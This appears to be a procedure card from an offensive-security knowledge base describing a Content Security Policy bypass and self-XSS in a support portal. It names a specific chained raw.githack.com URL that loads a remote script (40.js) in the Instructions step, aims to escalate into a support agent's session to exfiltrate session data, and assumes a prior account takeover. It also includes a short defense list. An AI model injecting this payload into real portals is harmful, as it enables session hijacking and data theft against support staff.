---
id: c3d4e5f6-g7h8-9012-cdef-345678901234
tags:
  - csp-bypass
  - xss
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T12:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T17:33:06.280Z'
skill_level: intermediate
impact_level: medium
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# CSP-Bypass-and-Self-XSS-in-Support-Portal

## Summary

This procedure bypasses Content Security Policy (CSP) in the support portal via HTML injection, enabling self-XSS that can escalate to the support agent's browser when they review chats.

## Description

The support portal allows HTML injection points vulnerable to CSP evasion using crafted URLs that chain external resources. Injecting a URL like https://raw.githack.com/mattboldt/typed.js/master/lib/@https://github.com/checkm50/checkm50.github.io/master/40.js loads scripts without violating CSP, setting up self-XSS. When an agent reviews the chat, the payload executes in their context, potentially exfiltrating session data or URLs. Requires access to the support portal post-account takeover.

## Requirements

1. Access to support portal (e.g., via taken-over account)
2. Knowledge of CSP rules (inspect headers)
3. External server for payload hosting

## Defense

Defensive measures and detection strategies:

- Enforce strict CSP with no unsafe-inline or eval
- Sanitize all user inputs in chat logs
- Log and monitor script loads from external domains
- Use Content-Security-Policy-Report-Only for testing

## Objectives

1. Load arbitrary scripts in the portal
2. Escalate self-XSS to agent session
3. Prepare for URL exfiltration

## Instructions

### Step 1: Inspect CSP Rules

**Context**: Understand bypass opportunities.

Check response headers for CSP directives like script-src.

### Step 2: Craft and Inject Payload

**Context**: Use URL chaining to evade CSP.

In chat input, inject https://raw.githack.com/mattboldt/typed.js/master/lib/@https://github.com/checkm50/checkm50.github.io/master/40.js.

> Payload loads JS without CSP block. Expected output: Console shows script execution.

### Step 3: Verify Self-XSS

**Context**: Confirm payload readiness for escalation.

Test in console for errors; no CSP violation indicates success.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[JavaScript]] JavaScript

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- csp-bypass
- xss
